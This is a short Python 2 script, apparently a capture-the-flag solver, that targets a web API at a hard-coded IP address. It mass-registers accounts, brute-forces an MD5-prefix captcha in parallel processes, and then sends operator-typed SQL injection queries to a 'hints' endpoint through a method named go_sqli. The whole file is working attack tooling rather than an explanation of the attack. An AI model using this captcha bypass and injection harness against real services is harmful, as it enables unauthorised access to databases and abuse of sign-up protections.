from requests import Session
import multiprocessing
import hashlib
from time import sleep


class User(object):
    captcha = ''
    s = None

    REGISTER_URL = 'http://47.93.100.42:9999/api/register'
    LOGIN_URL = 'http://47.93.100.42:9999/api/login'
    GET_CAPTCHA_URL = 'http://47.93.100.42:9999/api/captcha'
    HINT_URL = 'http://47.93.100.42:9999/api/hints'

    HEADERS = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    def __init__(self, username, password):
        self.s = Session()

        u_data = {'username': username, 'password': password}

        self.s.post(self.REGISTER_URL, headers=self.HEADERS, data=u_data)        
        c = self.s.post(self.LOGIN_URL, headers=self.HEADERS, data=u_data)

        if c.text != '{"msg":"login success"}':
            raise IndexError

    def set_captcha(self):
        c = self.s.get(self.GET_CAPTCHA_URL)
        self.captcha = c.text.split('"captcha":"')[1].split('"')[0].strip()

    def go_sqli(self, code, query):
        data = {'captcha': str(code), 'hint': query}
        c = self.s.post(self.HINT_URL, headers=self.HEADERS, data=data)
        return c.text


def set_captcha(d):
    user = d['user']
    i = 0
    user.set_captcha()

    while True:
        if hashlib.md5(str(i)).hexdigest()[0:6] == user.captcha:
            d['code'] = i
            return i
        i += 1


WORKER = 20
USERNAME_PREFIX = 'junoXXXXXXMM'
PASSWORD = 'dlawnsdh1234'

with multiprocessing.Manager() as manager:
    user_list = []

    for i in xrange(WORKER):
        d = manager.dict()
        d['user'] = User('{}{}'.format(USERNAME_PREFIX, i), PASSWORD)
        user_list.append(d)

    mul_list = []

    for i in xrange(len(user_list)):
        mul_list.append(multiprocessing.Process(target=set_captcha, args=(user_list[i],)))
        mul_list[i].start()

    while True:
        for i in xrange(len(mul_list)):
            if not mul_list[i].is_alive():
                result = user_list[i]['user'].go_sqli(user_list[i]['code'], raw_input(">"))
                print 'result:', result
                print '-------------------'
                user_list[i]['user'] = User('{}{}'.format(USERNAME_PREFIX, i), PASSWORD)
                mul_list[i] = multiprocessing.Process(target=set_captcha, args=(user_list[i],))
                mul_list[i].start()
    
